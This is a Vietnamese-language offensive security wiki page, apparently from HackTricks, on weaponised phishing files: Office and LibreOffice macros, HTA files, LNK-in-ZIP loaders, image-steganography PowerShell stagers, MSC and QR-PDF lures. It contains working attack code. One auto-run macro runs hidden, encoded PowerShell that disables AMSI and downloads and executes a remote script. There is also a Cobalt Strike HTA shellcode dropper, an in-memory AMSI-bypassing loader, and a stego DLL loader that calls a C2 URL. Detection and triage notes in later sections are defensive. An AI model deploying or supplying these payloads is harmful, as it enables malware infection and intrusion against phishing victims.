# Tệp và tài liệu phishing

{{#include ../../banners/hacktricks-training.md}}

## Tài liệu Office

Microsoft Word thực hiện xác thực dữ liệu tệp trước khi mở tệp. Việc xác thực dữ liệu được thực hiện bằng cách nhận dạng cấu trúc dữ liệu theo tiêu chuẩn OfficeOpenXML. Nếu xảy ra lỗi trong quá trình nhận dạng cấu trúc dữ liệu, tệp đang được phân tích sẽ không được mở.

Thông thường, các tệp Word chứa macro sử dụng phần mở rộng `.docm`. Tuy nhiên, bạn có thể đổi tên tệp bằng cách thay đổi phần mở rộng mà vẫn giữ được khả năng thực thi macro.\
Ví dụ: theo thiết kế, tệp RTF không hỗ trợ macro, nhưng tệp DOCM được đổi tên thành RTF vẫn sẽ được Microsoft Word xử lý và có thể thực thi macro.\
Các cơ chế và thành phần bên trong tương tự cũng áp dụng cho toàn bộ phần mềm trong Microsoft Office Suite (Excel, PowerPoint, v.v.).

Bạn có thể sử dụng lệnh sau để kiểm tra những phần mở rộng nào sẽ được một số chương trình Office thực thi:

```bash
assoc | findstr /i "word excel powerp"
```

Các file DOCX tham chiếu đến một template từ xa (File –Options –Add-ins –Manage: Templates –Go) có chứa macro cũng có thể “thực thi” macro.

### Tải ảnh bên ngoài

Đi tới: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Field names**: includePicture, và **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor bằng macro

Có thể dùng macro để chạy mã tùy ý từ tài liệu.

#### Hàm tự động tải

Chúng càng phổ biến thì khả năng bị AV phát hiện càng cao.

- AutoOpen()
- Document_Open()

#### Ví dụ mã macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Xóa metadata theo cách thủ công

Đi tới **File > Info > Inspect Document > Inspect Document** để mở Document Inspector. Nhấp **Inspect**, sau đó nhấp **Remove All** bên cạnh **Document Properties and Personal Information**.

#### Phần mở rộng Doc

Khi hoàn tất, chọn danh sách thả xuống **Save as type**, đổi định dạng từ **`.docx`** sang Word 97-2003 **`.doc`**.\
Làm vậy vì bạn **không thể lưu macro bên trong tệp `.docx`** và phần mở rộng hỗ trợ macro **`.docm`** thường bị **nghi ngại** (ví dụ: biểu tượng hình thu nhỏ có dấu `!` rất lớn và một số cổng web/email chặn hoàn toàn các tệp này). Vì vậy, **phần mở rộng `.doc` cũ là lựa chọn dung hòa tốt nhất**.

#### Công cụ tạo Malicious Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro tự chạy LibreOffice ODT (Basic)

Tài liệu LibreOffice Writer có thể nhúng macro Basic và tự động thực thi khi mở tệp bằng cách gán macro cho sự kiện **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Một macro reverse shell đơn giản như sau:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Lưu ý dấu ngoặc kép lặp (`""`) bên trong chuỗi – LibreOffice Basic dùng chúng để escape dấu ngoặc kép theo nghĩa đen, vì vậy các payload kết thúc bằng `...==""")` sẽ giữ cân bằng cả command bên trong lẫn đối số Shell.

Mẹo gửi:

- Lưu dưới dạng `.odt` và gán macro cho sự kiện của tài liệu để macro chạy ngay khi tài liệu được mở.
- Khi gửi email bằng `swaks`, hãy dùng `--attach @resume.odt` (`@` là bắt buộc để gửi nội dung file dưới dạng tệp đính kèm, thay vì chuỗi tên file). Điều này rất quan trọng khi khai thác các SMTP server chấp nhận người nhận `RCPT TO` tùy ý mà không xác thực.

## Tệp HTA

HTA là một chương trình Windows **kết hợp HTML và các ngôn ngữ scripting (chẳng hạn như VBScript và JScript)**. Nó tạo giao diện người dùng và chạy như một ứng dụng "được tin cậy hoàn toàn", không bị giới hạn bởi mô hình bảo mật của trình duyệt.

HTA được thực thi bằng **`mshta.exe`**, thường được **cài đặt** cùng với **Internet Explorer**, khiến **`mshta` phụ thuộc vào IE**. Vì vậy, nếu IE đã bị gỡ cài đặt, HTA sẽ không thể thực thi.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Thẻ tệp đính kèm giả trong email HTML

Email HTML có thể bắt chước thẻ xem trước tệp đính kèm gốc của nhà cung cấp thay vì chứa tệp đính kèm thật. Talos quan sát thấy một thẻ Gmail được dựng lại từ bốn phần MIME PNG nội tuyến mã hóa Base64. Toàn bộ phần tử hiển thị được bọc trong một anchor, và giá trị người nhận trong `?m=<target-id>` cho phép theo dõi từng người nhận. Liên kết bắt đầu bằng `//` thay vì `http://` hoặc `https://`; trình duyệt phân giải dạng URL tương đối theo giao thức này, nhưng các công cụ trích xuất URL chỉ khớp URL đầy đủ có thể bỏ sót nó.<sup>[[11]](#references)</sup>

Trong quá trình phân tích, hãy kiểm tra MIME thô thay vì tin vào danh sách tệp đính kèm đã hiển thị. Tái dựng cách các phần ảnh nội tuyến tạo thành thẻ hiển thị, xác định anchor bao quanh nó và chuẩn hóa các giá trị `href` tương đối theo giao thức trước khi trích xuất URL.<sup>[[11]](#references)</sup>

Để kiểm tra giả mạo người gửi trong envelope/header và căn chỉnh DMARC, xem [các biện pháp đối phó giả mạo thư SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Buộc xác thực NTLM

Có một số cách để **buộc xác thực NTLM từ xa**, chẳng hạn như thêm **ảnh vô hình** vào email hoặc HTML mà người dùng sẽ truy cập (thậm chí qua HTTP MitM?). Hoặc gửi cho nạn nhân **địa chỉ tệp** có thể **kích hoạt** **xác thực** chỉ bằng cách **mở thư mục**.

**Xem các ý tưởng này và nhiều nội dung khác trong những trang sau:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Đừng quên rằng bạn không chỉ có thể đánh cắp hash hoặc thông tin xác thực mà còn có thể **thực hiện các cuộc tấn công NTLM relay**:

- [**Các cuộc tấn công NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay tới chứng chỉ)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loader + Payload nhúng trong ZIP (chuỗi fileless)

Các chiến dịch có hiệu quả cao phát tán một tệp ZIP chứa hai tài liệu mồi nhử hợp pháp (PDF/DOCX) và một tệp .lnk độc hại. Thủ thuật là loader PowerShell thực tế được lưu trong các byte thô của ZIP, sau một marker duy nhất, rồi .lnk trích xuất và chạy nó hoàn toàn trong bộ nhớ.<sup>[[2]](#references)</sup>

Luồng điển hình do lệnh PowerShell một dòng trong .lnk thực hiện:

1) Tìm ZIP gốc trong các đường dẫn phổ biến: Desktop, Downloads, Documents, %TEMP%, %ProgramData% và thư mục cha của thư mục làm việc hiện tại.
2) Đọc các byte ZIP và tìm marker được hardcode (ví dụ: xFIQCV). Mọi thứ sau marker là payload PowerShell được nhúng.
3) Sao chép ZIP vào %ProgramData%, giải nén tại đó và mở tệp mồi nhử .docx để tạo vẻ hợp pháp.
4) Bỏ qua AMSI cho tiến trình hiện tại: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Giải obfuscate stage tiếp theo (ví dụ: xóa tất cả ký tự #) và thực thi trong bộ nhớ.

Ví dụ khung PowerShell để trích xuất và chạy stage được nhúng:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Ghi chú
- Quá trình phân phối thường lạm dụng các subdomain PaaS có uy tín (ví dụ: *.herokuapp.com) và có thể giới hạn payload (phân phối ZIP vô hại dựa trên IP/UA).
- Giai đoạn tiếp theo thường giải mã shellcode base64/XOR rồi thực thi bằng Reflection.Emit + VirtualAlloc để giảm thiểu dấu vết trên ổ đĩa.

Persistence được sử dụng trong cùng chuỗi
- COM TypeLib hijacking của điều khiển Microsoft Web Browser để IE/Explorer hoặc bất kỳ ứng dụng nào nhúng điều khiển này tự động chạy lại payload.<sup>[[2]](#references)[[4]](#references)</sup> Xem chi tiết và các lệnh có thể dùng ngay tại đây:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Truy tìm/IOC
- Các tệp ZIP có chứa chuỗi marker ASCII (ví dụ: xFIQCV) được nối vào dữ liệu archive.
- Tệp .lnk liệt kê các thư mục cha/thư mục người dùng để tìm ZIP rồi mở tài liệu mồi.
- Can thiệp AMSI qua [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Các chuỗi email công việc kéo dài, kết thúc bằng liên kết được lưu trữ trên các domain PaaS đáng tin cậy.

## Dàn dựng bằng mồi nhử LNK trước → persistence bằng scheduled task → side-loading CPL đáng tin cậy

Một mẫu thường gặp khác là **`.lnk` giả dạng tài liệu**, lập tức mở mồi nhử vô hại trong khi âm thầm dàn dựng chuỗi tấn công thực sự ở nền.<sup>[[3]](#references)</sup>

Quy trình quan sát được:
1. Shortcut **giả dạng PDF** và dùng `conhost.exe` hoặc proxy tương tự để khởi chạy trình tải xuống PowerShell đã làm rối.
2. PowerShell phân mảnh các token dễ nhận biết (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) để các cơ chế phát hiện sơ sài tìm kiếm `iwr`, `gci`, `ren`, `cpi` hoặc `schtasks` không phát hiện được lệnh.
3. Stager tải **tài liệu mồi trước**, mở tài liệu đó cho nạn nhân, rồi tái tạo các tệp độc hại ở nền.
4. Payload có thể được ghi bằng **phần mở rộng giả** rồi đổi tên bằng cách loại bỏ các ký tự đệm, khiến các artifact `.exe` / `.cpl` dễ nhận biết xuất hiện muộn hơn.
5. Persistence được thiết lập bằng **scheduled task chạy theo phút**, khởi chạy một binary host đáng tin cậy từ đường dẫn mà người dùng có thể ghi.

Các manh mối truy tìm tối thiểu từ mẫu này:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Một bố cục staging hữu ích cần nhận biết là:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` hoặc `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Vì sao stage thứ hai khó bị phát hiện

Trong nghiên cứu tình huống của Rapid7, scheduled task liên tục chạy **`Fondue.exe`** từ `C:\Users\Public\`. Vì **`APPWIZ.cpl`** được đặt cùng thư mục và export **`RunFODW`**, binary Microsoft đáng tin cậy đã side-load CPL của attacker thay vì bản hợp pháp trong hệ thống.

Sau đó, CPL:
- Đọc blob **AES-256-CBC** từ `C:\Windows\Tasks\editor.dat`
- Giải mã blob thông qua **Windows CNG / `bcrypt.dll`**
- Cấp phát bộ nhớ có quyền thực thi và sao chép shellcode đã giải mã vào đó
- Thực thi shellcode gián tiếp bằng cách truyền con trỏ shellcode làm callback cho **`EnumUILanguagesW`**

Bước cuối này đáng được săn tìm riêng: malware thường tránh nhảy trực tiếp bằng `((void(*)())buf)()` mà thay vào đó lạm dụng một **WinAPI hợp pháp có nhận callback** để chuyển quyền thực thi.

Payload được giải mã trong chiến dịch này là shellcode **Donut**; nó ánh xạ PE cuối cùng hoàn toàn vào bộ nhớ rồi vá **AMSI/WLDP/ETW** trong tiến trình hiện tại trước khi chuyển giao quyền thực thi. Để tìm hiểu sâu hơn về side-loading và xử lý hậu khai thác trong bộ nhớ, xem:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Các điểm thực tế để săn tìm:
- `.lnk` khởi chạy `powershell.exe` hoặc `conhost.exe`, sau đó hiển thị một tài liệu mồi.
- Tệp được tải xuống trong thời gian ngắn vào **`C:\Users\Public\`**, rồi ngay lập tức được đổi tên từ các phần mở rộng vô nghĩa.
- Scheduled task có tên chung chung như `GoogleErrorReport`, chạy từ **các thư mục mà người dùng có quyền ghi**.
- Binary đáng tin cậy tải tệp **`.cpl` / `.dll`** từ cùng thư mục không thuộc hệ thống.
- Blob văn bản Base64 được ghi vào **`C:\Windows\Tasks\`**, rồi được module side-load đọc.

## Payload phân định bằng steganography trong ảnh (PowerShell stager)

Các chuỗi loader gần đây phân phối JavaScript/VBS đã làm rối; mã này giải mã và chạy PowerShell stager Base64. Stager tải xuống một ảnh (thường là GIF) chứa DLL .NET được mã hóa Base64, ẩn dưới dạng văn bản thuần giữa các dấu đánh dấu bắt đầu/kết thúc duy nhất. Script tìm các dấu phân cách này (ví dụ từng thấy ngoài thực tế: «<<sudo_png>> … <<sudo_odt>>>»), trích xuất phần văn bản nằm giữa, giải mã Base64 thành byte, nạp assembly vào bộ nhớ và gọi một phương thức entry đã biết với URL C2.<sup>[[5]](#references)</sup>

Quy trình
- Stage 1: JS/VBS dropper được lưu trữ → giải mã Base64 nhúng bên trong → khởi chạy PowerShell stager với -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → tải ảnh xuống, trích xuất Base64 nằm giữa các dấu đánh dấu, nạp DLL .NET vào bộ nhớ và gọi phương thức của nó (ví dụ: VAI), truyền URL C2 cùng các tùy chọn.
- Stage 3: Loader truy xuất payload cuối cùng và thường inject payload này bằng process hollowing vào một binary đáng tin cậy (thường là MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tìm hiểu thêm về process hollowing và thực thi proxy thông qua tiện ích đáng tin cậy tại đây:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ví dụ PowerShell trích xuất DLL từ ảnh và gọi phương thức .NET trong bộ nhớ:

<details>
<summary>Trình trích xuất và loader payload stego bằng PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Ghi chú
- Đây là ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Các marker khác nhau giữa các chiến dịch.
- AMSI/ETW bypass và giải obfuscation chuỗi thường được thực hiện trước khi tải assembly.
- Săn tìm: quét ảnh đã tải xuống để tìm các dấu phân cách đã biết; xác định PowerShell truy cập ảnh và giải mã ngay các blob Base64.

Xem thêm các công cụ stego và kỹ thuật carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Một stage ban đầu thường gặp là tệp `.js` hoặc `.vbs` nhỏ, bị obfuscation nặng và được gửi bên trong một archive. Mục đích duy nhất của nó là giải mã một chuỗi Base64 nhúng và khởi chạy PowerShell với `-nop -w hidden -ep bypass` để bootstrap stage tiếp theo qua HTTPS.<sup>[[5]](#references)</sup>

Logic khung (khái quát):
- Đọc nội dung tệp của chính nó
- Tìm blob Base64 nằm giữa các chuỗi rác
- Giải mã thành PowerShell ASCII
- Thực thi bằng `wscript.exe`/`cscript.exe`, gọi `powershell.exe`

Dấu hiệu săn tìm
- Tệp đính kèm JS/VBS trong archive khởi chạy `powershell.exe` với `-enc`/`FromBase64String` trong command line.
- `wscript.exe` khởi chạy `powershell.exe -nop -w hidden` từ các đường dẫn temp của người dùng.

## Tài liệu MSC làm container thực thi (GrimResource)

Tệp Microsoft Management Console (`.msc`) là các định nghĩa console dạng XML, thường được mở bằng `mmc.exe`. **GrimResource** vũ khí hóa một tham chiếu `StringTable` đến tài nguyên `apds.dll` có chứa một XSS primitive cũ, khiến JavaScript chạy bên trong `mmc.exe` khi người dùng mở console được tạo thủ công. Các mẫu đã quan sát kết hợp kỹ thuật obfuscation dựa trên `transformNode` với **DotNetToJScript** để khởi tạo payload .NET mà không cần dùng đến đường thực thi macro Office thông thường.<sup>[[9]](#references)</sup>

Để phân tích tĩnh ban đầu, hãy coi MSC không đáng tin cậy là văn bản và **không** nhấp đúp vào nó:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Các dấu hiệu runtime có giá trị cao gồm `mmc.exe` tải CLR hoặc các thành phần script, tạo kết nối mạng, hoặc khởi chạy `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` hay một executable không mong đợi. Định dạng này là hợp lệ, vì vậy các quy tắc phát hiện nên tương quan **nguồn gốc + nội dung XML/script đáng ngờ + hành vi của `mmc.exe`**, thay vì chặn mọi tệp MSC.<sup>[[9]](#references)</sup>

## Tệp PDF/QR chuyển hướng và kiểm soát phân phối payload

PDF không cần khai thác lỗ hổng mới có thể hữu ích. Các chiến dịch gần đây đặt **mã QR hoặc liên kết thông thường** trong một tài liệu trông có vẻ vô hại, đưa phiên trình duyệt ra khỏi các biện pháp kiểm soát email và cá nhân hóa đích đến bằng địa chỉ người nhận. Microsoft đã ghi nhận các tệp PDF năm 2025 có URL mã QR riêng cho từng người nhận, dẫn đến hạ tầng thu thập thông tin xác thực RaccoonO365; một chuỗi tấn công song song sử dụng cơ chế kiểm soát dựa trên IP/môi trường để trả về đường dẫn JavaScript/MSI cho những khách truy cập được chọn, nhưng trả về một PDF vô hại cho các trình quét hoặc client không được phép.<sup>[[10]](#references)</sup>

Phân loại cả các hành động trong PDF lẫn mã QR đã được hiển thị. Mã QR có thể được vẽ dưới dạng vector thay vì lưu dưới dạng hình ảnh có thể trích xuất, vì vậy hãy chuyển đổi từng trang thành ảnh raster, đồng thời trích xuất các hình ảnh được nhúng:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kiểm tra các đích đến đã giải mã và chuỗi redirect từ một hệ thống phân tích cô lập mà không cần xác thực. Các đặc điểm hữu ích để săn tìm gồm PDF chỉ chứa QR với phần nội dung email gần như trống, email người nhận được nhúng trong query parameter, nhiều redirect qua các dịch vụ hosting uy tín và nội dung khác nhau tùy theo IP, vị trí địa lý, cookie, referrer hoặc user agent. So sánh các request bằng những profile được kiểm soát, vì một lần sandbox fetch duy nhất có thể chỉ nhận được nội dung mồi.<sup>[[10]](#references)</sup>

## Các tệp Windows dùng để đánh cắp NTLM hashes

Xem trang về **những nơi có thể đánh cắp NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công phishing tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Theo dõi tradecraft của Dropping Elephant qua chuỗi loader chủ đề Trung Quốc](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Chiếm quyền TypeLib – Kỹ thuật COM persistence mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader phát tán nhiều loại infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Thực thi proxy bằng tiện ích dành cho nhà phát triển đáng tin cậy: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console để initial access và né tránh](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tác nhân đe dọa lợi dụng mùa khai thuế để triển khai các chiến dịch phishing theo chủ đề thuế](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Chuỗi phát tán UAT-11587 và backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
